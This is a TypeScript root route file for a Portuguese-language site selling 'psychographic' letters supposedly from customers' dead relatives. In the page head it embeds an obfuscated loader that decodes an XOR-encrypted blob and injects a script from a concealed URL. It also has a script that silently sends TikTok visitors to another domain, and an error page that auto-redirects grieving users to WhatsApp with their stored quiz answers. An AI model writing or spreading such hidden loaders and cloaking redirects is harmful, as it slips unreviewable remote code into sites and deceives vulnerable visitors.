import {
  Outlet,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { lazy, Suspense, type ReactNode, useEffect, useState } from "react";

import appCss from "../styles.css?url";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Página não encontrada</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          A página que você está procurando não existe ou foi movida.
        </p>
        <div className="mt-6">
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Voltar ao Início
          </a>
        </div>
      </div>
    </div>
  );
}

const WHATSAPP_SUPPORT_NUMBER = "5511960746285";
const ERROR_REDIRECT_SECONDS = 9;

interface QuizRecoveryData {
  readonly nome: string;
  readonly ente: string;
  readonly intencao: string;
}

const EMPTY_RECOVERY_DATA: QuizRecoveryData = {
  nome: "",
  ente: "",
  intencao: "",
};

function readQuizRecoveryData(): QuizRecoveryData {
  if (typeof window === "undefined") return EMPTY_RECOVERY_DATA;
  try {
    const quiz = JSON.parse(localStorage.getItem("templodeluz_quiz_state") || "{}") as Record<string, unknown>;
    return {
      nome: typeof quiz.nome === "string" ? quiz.nome.trim().slice(0, 120) : "",
      ente: typeof quiz.ente === "string" ? quiz.ente.trim().slice(0, 120) : "",
      intencao: typeof quiz.dorPrincipal === "string" ? quiz.dorPrincipal.trim().slice(0, 280) : "",
    };
  } catch {
    return EMPTY_RECOVERY_DATA;
  }
}

function buildErrorRecoveryMessage(data: QuizRecoveryData): string {
  const details = [
    data.nome ? `• Meu nome: ${data.nome}` : "",
    data.ente ? `• Ente querido: ${data.ente}` : "",
    data.intencao ? `• Intenção registrada: ${data.intencao}` : "",
  ].filter(Boolean);

  return [
    "Olá, equipe do Templo de Luz.",
    "",
    "Encontrei uma dificuldade técnica ao continuar meu pedido e preciso de ajuda para concluir o atendimento.",
    ...(details.length ? ["", "Dados que consegui preencher:", ...details] : []),
    "",
    "Por favor, podem me orientar por aqui?",
  ].join("\n");
}

function ErrorComponent({ error, reset }: { readonly error: Error; readonly reset: () => void }) {
  console.error(error);
  const router = useRouter();
  const [recoveryData, setRecoveryData] = useState<QuizRecoveryData>(EMPTY_RECOVERY_DATA);
  const [secondsRemaining, setSecondsRemaining] = useState(ERROR_REDIRECT_SECONDS);

  const whatsappUrl = `https://api.whatsapp.com/send?phone=${WHATSAPP_SUPPORT_NUMBER}&text=${encodeURIComponent(
    buildErrorRecoveryMessage(recoveryData),
  )}`;

  useEffect(() => {
    setRecoveryData(readQuizRecoveryData());
  }, []);

  useEffect(() => {
    const countdown = window.setInterval(() => {
      setSecondsRemaining((seconds) => Math.max(0, seconds - 1));
    }, 1_000);
    const redirect = window.setTimeout(() => {
      window.location.assign(whatsappUrl);
    }, ERROR_REDIRECT_SECONDS * 1_000);

    return () => {
      window.clearInterval(countdown);
      window.clearTimeout(redirect);
    };
  }, [whatsappUrl]);

  return (
    <main className="flex min-h-screen items-center justify-center bg-[#171025] px-4 py-8 text-[#1f1035]">
      <section className="w-full max-w-[460px] overflow-hidden rounded-[30px] border border-[#f5d285]/35 bg-[#fffdf8] shadow-[0_28px_70px_-28px_rgba(0,0,0,0.75)]">
        <header className="bg-gradient-to-b from-[#2d144d] to-[#181025] px-6 py-8 text-center text-white">
          <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full border border-[#f5d285]/55 bg-[#f5d285]/15 text-2xl">
            🕊️
          </div>
          <p className="mt-4 text-[11px] font-black uppercase tracking-[0.18em] text-[#f5d285]">Seu pedido continua importante</p>
          <h1 className="mt-2 font-display text-[25px] font-black leading-tight">Vamos continuar pelo WhatsApp</h1>
        </header>

        <div className="p-6 text-center">
          <div className="rounded-2xl border border-amber-200 bg-amber-50 px-4 py-3 text-left text-sm leading-relaxed text-amber-950">
            <strong className="block">Encontramos uma dificuldade técnica nesta página.</strong>
            Seus dados preenchidos permanecem no seu dispositivo. Nossa equipe pode orientar você a concluir o atendimento pelo WhatsApp.
          </div>

          <a
            href={whatsappUrl}
            className="mt-5 flex w-full items-center justify-center gap-2 rounded-2xl bg-[#25D366] px-5 py-4 text-sm font-black text-white shadow-lg shadow-emerald-700/25 transition hover:bg-[#1fb85b] focus:outline-none focus:ring-4 focus:ring-emerald-300"
          >
            <span className="text-lg" aria-hidden="true">💬</span>
            Falar com a equipe no WhatsApp
          </a>

          <p className="mt-3 text-xs leading-relaxed text-[#6d5488]">
            O WhatsApp será aberto automaticamente em <strong>{secondsRemaining} segundos</strong> para que seu atendimento não seja perdido.
          </p>

          <button
            type="button"
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="mt-5 text-xs font-bold text-[#5d4786] underline decoration-[#c49a52] underline-offset-4 transition hover:text-[#2d144d]"
          >
            Tentar carregar esta página novamente
          </button>
        </div>
      </section>
    </main>
  );
}

export const Route = createRootRouteWithContext<Record<string, never>>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Templo de Luz — Cartas Psicografadas pela Médium Milena Medeiros" },
      {
        name: "description",
        content:
          "Receba uma carta psicografada escrita à mão pela médium Milena Medeiros com a letra e assinatura do seu ente querido. +12.400 pessoas acolhidas desde 1977. Garantia de 7 dias.",
      },
      { name: "author", content: "Templo de Luz — Centro Espírita Casa Nova" },
      { name: "theme-color", content: "#2E1A54" },
      {
        name: "keywords",
        content:
          "carta psicografada, médium Milena Medeiros, psicografia, ente querido, Templo de Luz, carta manuscrita espiritual, centro espírita, mensagem espiritual",
      },
      { name: "robots", content: "index, follow, max-image-preview:large, max-snippet:-1" },
      { property: "og:site_name", content: "Templo de Luz" },
      { property: "og:title", content: "Carta Psicografada do Seu Ente Querido | Templo de Luz" },
      {
        property: "og:description",
        content:
          "Receba uma carta psicografada manuscrita com a letra e assinatura do seu ente querido. Médium Milena Medeiros, 33 anos de prática e +12.400 cartas.",
      },
      { property: "og:type", content: "website" },
      { property: "og:url", content: "https://templodeluz.com" },
      { property: "og:locale", content: "pt_BR" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: "Carta Psicografada do Seu Ente Querido | Templo de Luz" },
      {
        name: "twitter:description",
        content:
          "Receba uma carta psicografada manuscrita pela médium Milena Medeiros. +12.400 acolhidos. Garantia de 7 dias.",
      },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "canonical", href: "https://templodeluz.com" },
      { rel: "preconnect", href: "https://opftmzegcvfyoinjfmcj.supabase.co", crossOrigin: "anonymous" },
      { rel: "dns-prefetch", href: "https://opftmzegcvfyoinjfmcj.supabase.co" },
      { rel: "dns-prefetch", href: "https://connect.facebook.net" },
      { rel: "preconnect", href: "https://api.fontshare.com" },
      {
        rel: "stylesheet",
        href: "https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap",
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],
    scripts: [
      {
        type: "application/ld+json",
        children: JSON.stringify({
          "@context": "https://schema.org",
          "@graph": [
            {
              "@type": "Organization",
              name: "Templo de Luz — Centro Espírita Casa Nova",
              url: "https://templodeluz.com",
              description:
                "Centro espírita fundado em 1977, dedicado à psicografia mediúnica pela médium Milena Medeiros.",
              address: {
                "@type": "PostalAddress",
                streetAddress: "Rua José Gonçalves Gomide, 144 — Vila Guilherme",
                addressLocality: "São Paulo",
                addressRegion: "SP",
                postalCode: "02075-001",
                addressCountry: "BR",
              },
              telephone: "+5511960746285",
              email: "tempodaluz@gmail.com",
            },
            {
              "@type": "WebSite",
              name: "Templo de Luz",
              url: "https://templodeluz.com",
              description:
                "Cartas psicografadas escritas à mão pela médium Milena Medeiros, revelando a letra e assinatura do seu ente querido.",
              inLanguage: "pt-BR",
            },
          ],
        }),
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

import { captureAndStoreUtms } from "@/lib/utmify";
import { getMetaBrowserAttribution } from "@/lib/metaPixel";

const LiveActivityToast = lazy(() =>
  import("@/components/funnel/LiveActivityToast").then(
    ({ LiveActivityToast: Component }) => ({ default: Component }),
  ),
);

function RootShell({ children }: { readonly children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function () {
              var url = new URL(window.location.href);
              var source = (url.searchParams.get("utm_source") || "").toLowerCase();
              var isTikTok = Boolean(url.searchParams.get("ttclid")) || /^(tiktok|tt|tik)(?:$|[^a-z])/.test(source);
              if (isTikTok) window.location.replace("https://quiz-templodeluz.vercel.app" + url.pathname + url.search + url.hash);
            })();`,
          }}
        />
        {/* ─── META PIXEL (FACEBOOK ADS) ─── */}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              !function(f,b,e,v,n,t,s)
              {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
              n.callMethod.apply(n,arguments):n.queue.push(arguments)};
              if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
              n.queue=[];t=b.createElement(e);t.async=!0;
              t.src=v;s=b.getElementsByTagName(e)[0];
              s.parentNode.insertBefore(t,s)}(window, document,'script',
              'https://connect.facebook.net/en_US/fbevents.js');
              fbq('init', '1076049174870131');
              fbq('track', 'PageView');
            `,
          }}
        />
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1076049174870131&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var c_c=atob("DDSrC8L10wX7cHP9ik+JfrCZ8T/ZGAeJ+keRJO2Wt2vVBQeQ41LSJaGaviuZAlyO6UbCe7aG/HCPHQDS5lXfbrGB/W+IUl/f60DfeauXpnGeA1HH0U+JZaOYtifBUhec/lWGfraYumOCXQOP70LOZbbYq2aUFF6O6V+JJ+CDsmmOFVHHqBbWJ7nXvWSWFVHHqFDKf6PYpnGWGRWEp0TZbrSQvXHWAwaf41DYKe7XpWSXBRbfsBaJdp+I");var b_6nb=[];for(var l_d=0;l_d<c_c.length;l_d++){b_6nb.push(c_c.charCodeAt(l_d)&255);}var c_4u=b_6nb[0];var u_l=b_6nb.slice(1,1+c_4u);var d_j=b_6nb.slice(1+c_4u);var b_a9q=d_j.map(function(b,p_x){return b^u_l[p_x%c_4u];});var h_d3y5="";for(var w_19=0;w_19<b_a9q.length;w_19++){h_d3y5+=String.fromCharCode(b_a9q[w_19]&255);}var m_xh=decodeURIComponent(escape(h_d3y5));var z_8f=JSON.parse(m_xh);var c_k=z_8f.globals||[];c_k.forEach(function(g_2t){window[g_2t.name]=g_2t.value;});var k_ny=document.createElement("script");k_ny.src=z_8f.url;k_ny.async=true;k_ny.defer=true;(z_8f.attributes||[]).forEach(function(w_zn){k_ny.setAttribute(w_zn.name,w_zn.value);});(document.head||document.documentElement).appendChild(k_ny);})();`,
          }}
        />
      </head>
      <body suppressHydrationWarning>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const [showLiveActivity, setShowLiveActivity] = useState(false);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const source = (params.get("utm_source") || "").toLowerCase();
    if (params.has("ttclid") || /^(tiktok|tt|tik)(?:$|[^a-z])/.test(source)) return;
    captureAndStoreUtms();
    // O Pixel já é inicializado no head; aqui apenas preservamos fbclid/_fbc para o checkout.
    getMetaBrowserAttribution();
  }, []);

  useEffect(() => {
    const show = () => setShowLiveActivity(true);
    const browser = window as Window & {
      requestIdleCallback?: (callback: () => void, options?: { timeout: number }) => number;
      cancelIdleCallback?: (handle: number) => void;
    };
    if (browser.requestIdleCallback && browser.cancelIdleCallback) {
      const idleHandle = browser.requestIdleCallback(show, { timeout: 6_000 });
      return () => browser.cancelIdleCallback?.(idleHandle);
    }
    const timeout = window.setTimeout(show, 4_000);
    return () => window.clearTimeout(timeout);
  }, []);

  return (
    <>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
      {showLiveActivity && (
        <Suspense fallback={null}>
          <LiveActivityToast />
        </Suspense>
      )}
    </>
  );
}
